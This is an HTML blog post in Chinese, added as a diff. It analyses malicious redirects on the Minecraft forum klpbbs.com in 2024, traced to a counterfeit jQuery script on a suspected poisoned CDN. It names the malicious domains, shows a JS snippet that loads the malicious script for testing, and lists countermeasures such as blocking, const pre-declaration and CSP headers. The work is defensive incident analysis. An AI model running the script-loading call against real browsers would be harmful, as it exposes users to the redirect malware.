@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+<!-- Iushm OK -->
+<title>24年7月前后的恶意跳转事件 Cy Sakarwei GHP</title>
+<link href="/favicon.ico" type="image/x-icon" rel="shotcut icon"/>
+
+	
+<link rel="stylesheet" href="/suk_ghp/res/index.css">
+
+
+
+<script src="/suk_ghp/res/saka.js"></script>
+
+<meta charset="UTF-8">
+<meta name="author" content="Saka,JIC,Yange">
+<meta name="description" content="2024/12/20 2024年7月前后，苦力怕论坛（klpbbs.com）移动端访问者访问论坛页面时偶尔会跳转到恶意站点，有人反馈在 MineBBS 也有类似现象。对此我们进行了一定的研究，本文是我们的研究成果和想法分享。"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- Igmj KSU je -->
+<body>
+	<div id="main">
+		<div class="page">
+			<div class="content">
+				<div id="ksu"><a href="/index.html"><img src="/suk_ghp/res/root.gif"/></a><a href="/suk_ghp/index.html"><img src="/suk_ghp/res/home.gif"/></a>&nbsp;SakaGHP Blog<hr/></div>
+				<section id="iushm">
+					
+<h1>24年7月前后的恶意跳转事件</h1>
+<div class="irfrtani">
+	<m>於</m> <time>24年7月27日</time>（最新編輯：<time>24年12月20日</time>）<br/>
+	
+	<m>作</m>
+	<a href="/suk_ghp/authors/tags/Cy-Saka">Saka</a> y 
+	<a href="/suk_ghp/authors/tags/Cy-JIC">JIC</a> y 
+	<a href="/suk_ghp/authors/tags/Cy-Yange">Yange</a>
+	
+
+	
+	<div class="article-category">
+		<m>类</m>
+		<a class="article-category-link" href="/suk_ghp/categories/%E6%8A%80%E6%9C%AF/">技术</a> 〉<a class="article-category-link" href="/suk_ghp/categories/%E6%8A%80%E6%9C%AF/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+	</div>
+
+<m>籤</m>
+<span class="tag"><a href="/suk_ghp/tags/信息安全">信息安全</a></span> y <span class="tag"><a href="/suk_ghp/tags/Minecraft-社区">Minecraft-社区</a></span>
+	<p class="iozuta">2024年7月前后，苦力怕论坛（klpbbs.com）移动端访问者访问论坛页面时偶尔会跳转到恶意站点，有人反馈在 MineBBS 也有类似现象。对此我们进行了一定的研究，本文是我们的研究成果和想法分享。</p>
+</div>
+<blockquote>
+<p>问题排查过程有关发帖：</p>
+<ul>
+<li>访问论坛有几率跳转至非法网站 <a target="_blank" rel="noopener" href="https://klpbbs.com/thread-141636-1-1.html">https://klpbbs.com/thread-141636-1-1.html</a></li>
+<li>被送到恶意站点怎么办 <a target="_blank" rel="noopener" href="https://klpbbs.com/thread-142380-1-1.html">https://klpbbs.com/thread-142380-1-1.html</a></li>
+</ul>
+</blockquote>
+<p>　　经过长时间的排查之后，Saka 发现，在绝大多数情况下，移动端转移页面时，加载的第三方 JS 脚本只有 hm.js（似乎是百度统计的）。但是偶尔这些加载的 第三方 JS 却出现了一些其它文件的身影——</p>
+<ul>
+<li>jquery.min-3.7.0.js → （Cy: <strong>cdn[.]jsdelivr[.]vip</strong>）</li>
+<li>checkcache.js →（Cy: <strong>union[.]macoms[.]la</strong>）</li>
+</ul>
+<p>　　经过简单溯源，我们发现，发起 checkcache.js 请求的文件是 jquery.min-3.7.0.js；发起 jquery.min-3.7.0.js 请求的文件是页面。<br>　　了解到 Discuz 喜欢使用模板拼合加载网页，我们考虑这<em>可能</em>是模板 PHP 文件被嵌入恶意代码。此恶意代码使用 Html 的 script 标签要求浏览器加载并运行 <code>hxxps://cdn[.]jsdelivr[.]vip/jquery.min-3.7.0.js</code> 。</p>
+<p>　　经过大量刷新和尝试，我们发现，请求脚本的代码出现不稳定，因此我们采取补全策略。为了探究其载入和跳转机制，我们的思路是，是页面的相关请求代码导致问题的发生，那么当页面不提供的时候，我们就自己补上。如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">saka_mkjs</span>(<span class="params">url</span>)&#123;</span><br><span class="line">　　<span class="keyword">var</span> x=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">　　x.<span class="property">src</span>=url;</span><br><span class="line">　　<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　然后是实践。实践代码：插入JS。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">saka_mkjs</span>(<span class="string">&quot;https://cdn.jsdelivr[.]vip/jquery.min-3.7.0.js&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>　　Saka 发现这个 JS 很狡猾。这个 JS 不仅加密，而且也使用概率访问。即使加载了这个 JS，这个 JS 也不一定会去找 union[.]macoms[.]la 去请求 checkcache.js 文件。<br>　　后续某一次实现跳转的时候，Saka 非常幸运地找到了关键性的决定参数——“usercache”。其实不是 checkcache.js 返回了这个参数的内容，而是某次刷新的时候，Saka 意外发现一条报错，说什么 usercache 未定义。于是 Saka 就尝试了给 usercache 添加参数，最后反复刷新，实现跳转。</p>
+<p>　　结合上述信息后，我们最初猜想的跳转机制如下：</p>
+<blockquote>
+<p>论坛服务器内的 PHP 决定是否向用户表示恶意代码需求；（选否则筛除）（这是 Saka 个人的猜测，因为我看不到 PHP 原文件。）</p>
+</blockquote>
+<p><strong>然而，后证伪</strong></p>
+<p>　　后续我们接到 苦力怕纸（苦力怕论坛站长） 反馈，称在源代码中没有找到相关引用。由于我们不知道彼具体操作，我们考虑的是或许代码经过加密、藏匿了相关重点信息导致检索无效。于是我们建议其重点排查涉事模板，尤其是加密代码。检索无果。至此，问题排查依旧没有任何进展。</p>
+<p>至此 JS 脚本部分的跳转机制已经明了，其前尚不明确。</p>
+<ul>
+<li>来自 jsdelivr[.]vip 的 仿冒 jQuery 决定是否从 union[.]macoms[.]la 获取 checkcache.js（选否则筛除）</li>
+<li>union[.]macoms[.]la 决定是否给出“usercache&#x3D;true”的回应要求 仿冒 jQuery 进行跳转（回应空文件即选否，则筛除）</li>
+<li>以上全发生时，中选，跳转到恶意站点。</li>
+</ul>
+<hr>
+<p>　　后续我们考虑到，本次对抗的当务之急是阻止跳转的发生，因此此时我们暂时转移了工作重点，面向对抗脚本。<br>　　我们考虑到，JS 中有一个语句，名曰 const，可以阻止非 const 部分修改全局函数和变量。那么，利用这个思路，我们分析了代码后，选择了如下对策，可以暂时限制这些恶意代码的执行：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> loadJS=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> _0x2d7370=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> _0x403866=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> _0x3b0ea1=<span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>　　关键点：在带毒脚本运行之前事先占用该脚本需要的函数或参数。<br>　　理想结果：在毒脚本不出现时风平浪静，毒脚本出现时：由于毒脚本需要声明的参数或函数 事先 被 const 声明，在控制台报错：</p>
+<blockquote>
+<p>Uncaught SyntaxError: Identifier ‘_______’ has already been declared (at ……)</p>
+</blockquote>
+<p>　　那么就算脚本被请求并执行了，也会因为 const 的规定占用了它的关键函数而无法实现跳转。<br>　　Saka 在控制台上执行成功，但不清楚这个怎么掐时间会比较准。不过，我们发现，这个 仿冒的 jQuery 需要一定的时间解密，所以就算我们先插入了恶意代码，只要我们手速够块（0.6s 内），都可以破坏环境。</p>
+<blockquote>
+<p><strong>Saka 后记：其实对大多数现代浏览器而言，使用防止跨站脚本攻击和内容访问的“content-security-policy”和“x-xss-protection”响应头也是一个有效打开策。</strong></p>
+</blockquote>
+<hr>
+<p>在以上信息获取不久后，苦力怕论坛内用户 和乐果 提到了几种另外的可能性：Nginx 源代码投毒、上游 CDN 系统投毒。注意，CDN 投毒和 CDN 系统投毒不是同一概念：CDN 投毒代表 CDN 提供的内容带毒，CDN 系统投毒代表 CDN 的上游投毒发生。<br>该消息指， cdn.jsdelivr[.]vip 域名指向的 IP 来自 funnull 的 cdn，来自 funnull 的 cdn（他提供的参考来源：<a target="_blank" rel="noopener" href="https://www.54yt.net/435.html">https://www.54yt.net/435.html</a> ）；论坛使用到了 木韩网络的 CDN ，此 CDN ，goedge CDN系统使用，而 goedge CDN 曾遭受供应链攻击（Cy:<a target="_blank" rel="noopener" href="https://bbs.naixi.net/thread-110-1-1.html">https://bbs.naixi.net/thread-110-1-1.html</a> ）</p>
+<p>在相关线索的基础上，Saka 也检查了木韩网络的官方网站 （muhan.co），发现其官网沦陷。结合上述可获得信息分析，我们考虑，这个极有可能是 木韩网络 方使用的 CDN 系统投毒。<br>加注：木韩网络是苦力怕论坛的 CDN 上游提供方。</p>
+<hr>
+<p>那么，我们对策如何？</p>
+<p>一方，是面向普通访问者的：</p>
+<ul>
+<li>通过配置或插件，要求浏览器&#x2F;路由器&#x2F;操作系统 屏蔽两个病毒关键域名——“cdn.jsdelivr[.]vip”和“union[.]macoms[.]la”</li>
+<li>使用的浏览器有举报功能，检举上述两个域名。其中，着重提醒检举人，前者定罪链接为“hxxps:&#x2F;&#x2F;cdn.jsdelivr[.]vip&#x2F;jquery.min-3.7.0.js”</li>
+<li>向相关部门举报链接，类似第二点。</li>
+<li><del>对相关站点发起网络攻击，制止其继续运作。</del>（此举有法律风险）</li>
+</ul>
+<p>一方，是面向管理团队的：<br>一开始我们没有和乐果的情报，也没有考虑到 CDN 投毒，彼时我们的对策是：</p>
+<blockquote>
+<ul>
+<li>使用 grep 检索服务器内文件，重点排查模板和加密代码，发现后删除。</li>
+<li>使用 phpmyadmin 检索数据库，重点排查模板和加密代码，发现后删除。</li>
+<li>若排查无果，暂时为 Nginx 配置使用 subs_filter 设置相关域名为敏感词，阻止用户发起指向其的请求。</li>
+<li>排查无果时，考虑服务器内利用 inotifywait 监控文件、针对任务计划等可能修改文件的部分扩大排查范围。</li>
+<li>使用相关 JS 代码破坏恶意脚本的执行环境，以此制止用户跳转到恶意网站。（彼时这是在苦力怕纸反馈上述四条无用之后给出的对策）</li>
+</ul>
+</blockquote>
+<p>收到情报后我们马上作出调整：</p>
+<blockquote>
+<p>后续了解到 CDN 系统出现问题的可能性最大，遂要求 CDN 提供方发起自查。</p>
+</blockquote>
+<p>在进一步学习网络安全技术之后，我们补充了我们的对策：</p>
+<blockquote>
+<p>使用防止跨站脚本攻击和内容访问的“content-security-policy”和“x-xss-protection”响应头。</p>
+</blockquote>
+
+
+
+
+
+				</section>
+				<hr/>
+				<center>&copy;2014~2025 Sakarwei<br/>除非另有声明，本站内容採用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 方式授權。<br/>頁末出現本字段之頁面，採用 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 輔助生成<br/>
+<img src="https://badges.toozhao.com/badges/01JC2K3JD6REFRFC50VPEP65MT/blue.svg"/>
+</center>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
